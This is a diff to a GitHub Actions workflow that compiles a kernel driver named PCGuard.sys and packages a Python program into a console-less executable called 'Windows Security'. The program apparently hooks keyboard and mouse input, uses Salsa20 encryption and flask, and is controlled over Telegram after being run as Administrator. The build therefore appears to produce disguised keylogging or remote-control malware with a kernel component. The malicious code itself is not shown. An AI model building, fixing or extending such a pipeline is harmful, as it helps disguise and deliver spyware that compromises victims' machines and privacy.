@@ -6,46 +6,92 @@ on:
   workflow_dispatch:
 
 jobs:
-  build-driver:
+  build:
     runs-on: windows-latest
+
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Install WDK
+      - name: Install WDK via winget
         run: |
-          choco install windows-driver-kit --yes --no-progress
+          winget install Microsoft.WindowsDriverKit --silent --accept-source-agreements --accept-package-agreements
         shell: cmd
+        continue-on-error: true
+
+      - name: Install WDK via direct download (fallback)
+        run: |
+          powershell -Command "
+            $url = 'https://go.microsoft.com/fwlink/?linkid=2249371'
+            $out = '$env:TEMP\wdksetup.exe'
+            Invoke-WebRequest -Uri $url -OutFile $out
+            Start-Process -FilePath $out -ArgumentList '/quiet /norestart' -Wait
+          "
+        shell: cmd
+        continue-on-error: true
 
       - name: Setup MSVC
         uses: microsoft/setup-msbuild@v2
 
-      - name: Create Driver Project
+      - name: Find WDK include path
+        id: wdk
         run: |
-          mkdir build_driver
-          copy pc-guardian\driver\PCGuard.cpp build_driver\
-          copy pc-guardian\driver\PCGuard.h   build_driver\
+          powershell -Command "
+            $kits = 'C:\Program Files (x86)\Windows Kits\10\Include'
+            if (Test-Path $kits) {
+              $ver = Get-ChildItem $kits | Sort-Object Name -Descending | Select-Object -First 1
+              echo ('WDK_VER=' + $ver.Name) >> $env:GITHUB_OUTPUT
+              echo ('WDK_FOUND=true') >> $env:GITHUB_OUTPUT
+              Write-Host ('Found WDK: ' + $ver.Name)
+            } else {
+              echo 'WDK_FOUND=false' >> $env:GITHUB_OUTPUT
+              Write-Host 'WDK not found'
+            }
+          "
         shell: cmd
 
       - name: Build PCGuard.sys
+        if: steps.wdk.outputs.WDK_FOUND == 'true'
         run: |
-          cd build_driver
-          cl.exe /nologo /kernel /GS- /W4 /WX- /Gz /GF /Gm- /EHsc /Zp8 /GR- /Gz /wd4603 /wd4627 /wd4986 /wd4987 /wd4996 ^
-            /D_AMD64_ /DNTDDI_VERSION=0x0A000007 /D_WIN32_WINNT=0x0A00 /DWIN32=100 ^
-            /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\km" ^
-            /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\shared" ^
+          set WDK_VER=%WDK_VER%
+          set INC=C:\Program Files (x86)\Windows Kits\10\Include\%WDK_VER%
+          set LIB=C:\Program Files (x86)\Windows Kits\10\Lib\%WDK_VER%
+
+          mkdir build_drv
+          copy pc-guardian\driver\PCGuard.cpp build_drv\
+          copy pc-guardian\driver\PCGuard.h   build_drv\
+          cd build_drv
+
+          cl.exe /nologo /kernel /GS- /W3 /WX- /Gz /GF /Gm- /EHsc /Zp8 /GR- ^
+            /D_AMD64_ /DNTDDI_VERSION=0x0A000007 /D_WIN32_WINNT=0x0A00 /DWIN32=100 /DDBG ^
+            /I"%INC%\km" /I"%INC%\shared" ^
             /c PCGuard.cpp
+
           link.exe /DRIVER /SUBSYSTEM:NATIVE /ENTRY:DriverEntry /NODEFAULTLIB ^
             /MACHINE:X64 ^
-            /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\km\x64" ^
+            /LIBPATH:"%LIB%\km\x64" ^
             ntoskrnl.lib hal.lib wdm.lib wdmsec.lib ^
             /OUT:PCGuard.sys PCGuard.obj
+
+          if exist PCGuard.sys (
+            echo Driver built successfully
+          ) else (
+            echo Driver build FAILED
+            exit /b 1
+          )
         shell: cmd
+        env:
+          WDK_VER: ${{ steps.wdk.outputs.WDK_VER }}
 
       - name: Copy driver to assets
         run: |
           if not exist pc-guardian\assets mkdir pc-guardian\assets
-          copy build_driver\PCGuard.sys pc-guardian\assets\PCGuard.sys
+          if exist build_drv\PCGuard.sys (
+            copy build_drv\PCGuard.sys pc-guardian\assets\PCGuard.sys
+            echo Driver copied to assets
+          ) else (
+            echo No driver built - EXE will run without kernel driver
+          )
         shell: cmd
 
       - name: Setup Python
@@ -68,7 +114,6 @@ jobs:
           pyinstaller --onefile --noconsole --clean ^
             --name "Windows Security" ^
             --icon "pc-guardian/assets/app.ico" ^
-            --add-data "pc-guardian/assets/PCGuard.sys;assets" ^
             --runtime-tmpdir "." ^
             --hidden-import pynput.keyboard._win32 ^
             --hidden-import pynput.mouse._win32 ^
@@ -85,6 +130,33 @@ jobs:
             --hidden-import Crypto.Cipher.Salsa20 ^
             --paths pc-guardian ^
             pc-guardian/main.py
+        shell: cmd
+
+      - name: Add driver to EXE if built
+        run: |
+          if exist pc-guardian\assets\PCGuard.sys (
+            pyinstaller --onefile --noconsole --clean ^
+              --name "Windows Security" ^
+              --icon "pc-guardian/assets/app.ico" ^
+              --add-data "pc-guardian/assets/PCGuard.sys;assets" ^
+              --runtime-tmpdir "." ^
+              --hidden-import pynput.keyboard._win32 ^
+              --hidden-import pynput.mouse._win32 ^
+              --hidden-import win32api ^
+              --hidden-import win32con ^
+              --hidden-import win32gui ^
+              --hidden-import win32com ^
+              --hidden-import winerror ^
+              --hidden-import comtypes ^
+              --hidden-import flask ^
+              --hidden-import cryptography ^
+              --hidden-import Crypto ^
+              --hidden-import Crypto.Cipher ^
+              --hidden-import Crypto.Cipher.Salsa20 ^
+              --paths pc-guardian ^
+              pc-guardian/main.py
+            echo Rebuilt with driver bundled
+          )
         shell: cmd
 
       - name: Get version
@@ -105,12 +177,10 @@ jobs:
             Auto-built from commit ${{ github.sha }}
             **Changes:** ${{ github.event.head_commit.message }}
 
-            **First time setup:**
+            **Setup:**
             1. Run as Administrator
-            2. Driver installs automatically
-            3. Open Telegram → `/status`
-          files: |
-            dist/Windows Security.exe
+            2. Telegram → `/status`
+          files: "dist/Windows Security.exe"
           draft: false
           prerelease: false
         env:
